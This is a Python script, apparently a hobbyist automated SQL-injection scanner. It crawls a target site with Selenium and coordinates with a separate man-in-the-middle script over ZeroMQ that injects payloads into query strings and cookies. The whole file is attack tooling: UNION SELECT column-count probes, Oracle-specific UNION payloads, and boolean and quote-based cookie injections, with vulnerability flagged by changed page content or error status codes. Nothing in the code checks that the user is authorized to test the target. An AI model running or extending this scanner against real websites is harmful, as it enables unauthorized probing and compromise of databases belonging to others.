import sys
from selenium import webdriver
from selenium.webdriver.common.by import By
import zmq

# setting up the selenium browser
driver = webdriver.Firefox()
url = sys.argv[1]
driver.get(url)

# setting up communication between scripts
context = zmq.Context()
socket = context.socket(zmq.PAIR)
socket.connect("tcp://127.0.0.1:5555")


def start_script(payload, p_type):
    socket.send_string(p_type)
    if socket.recv_string() == "y":
        print(f"sending payload:{payload} over to script: " + payload)
        socket.send_string(payload)


def stop_script():
    # send mitm the signal so stop modifying packets
    socket.send_string("stop")


def union_attack(page):
    # perform a union attack to determine the number of columns
    source = driver.page_source
    # union attack payloads for different types of databases
    union_select = "' UNION SELECT NULL--", "' UNION SELECT NULL, NULL--", "' UNION SELECT NULL, NULL, NULL--", "' UNION SELECT NULL, NULL, NULL, NULL--", "' UNION SELECT NULL, NULL, NULL, NULL, NULL--"
    orcale_union = "' UNION+SELECT 'abc' FROM dual--", "' UNION+SELECT 'abc','def' FROM dual--", "' UNION+SELECT 'abc','def','ghi' FROM dual--", "' UNION+SELECT 'abc','def','ghi','jkl' FROM dual--"
    for payload in union_select:
        start_script(payload, "q")
        driver.get(page)
        stop_script()
        status = socket.recv_string()
        new_source = driver.page_source
        # finding which payload works, it should change the contents of the page and not return an error message
        if source != new_source and status[0] != "4" and status[0] != "5":
            print("this page is vulnerable to SQLi")
            return True
    for payload in orcale_union:
        start_script(payload, "q")
        driver.get(page)
        stop_script()
        status = socket.recv_string()
        new_source = driver.page_source
        if source != new_source and status[0] != "4" and status[0] != "5":
            print("this page is vulnerable to SQLi")
            return True
    return False


def cookie_attack(page):
    source = driver.page_source
    payloads = ["' AND '1'='1", "' AND '1'='2", "'", "''", "'--"]
    for payload in payloads:
        # if it retunrs an error message or - then it should be vulnerable
        start_script(payload, "c")
        driver.get(page)
        stop_script()
        status = socket.recv_string()
        new_source = driver.page_source
        # if modifying the cookie field got an error message or changed the contents of the site it's vulnerable
        if status[0] == "4" or status[0] == "5":
            print(f"this paylaod: {payload} is causing the site to return a status of {status}  indicting an error that indicates it's vulnerable")
            return True
    return False


def test_payloads(site):
    if not cookie_attack(site):
        if not union_attack(site):
            return False
    return True

def crawl_site():
    links = []
    already_visited = []
    found_end = False
    while not found_end:
        # go through site testing out different pages
        page_links = driver.find_elements(By.XPATH, "//a[@href]")
        for link in page_links:
            print(link.get_attribute("href"))
            if link.get_attribute("href") not in links and url in link.get_attribute("href") and link.get_attribute("href") not in already_visited:
                links.append(link.get_attribute("href"))
        next_page = links.pop()
        driver.get(next_page)
        already_visited.append(next_page)
        stop_script()
        if test_payloads(next_page):
            print("page is vulnerable!")
            return True


if __name__ == "__main__":
    crawl_site()
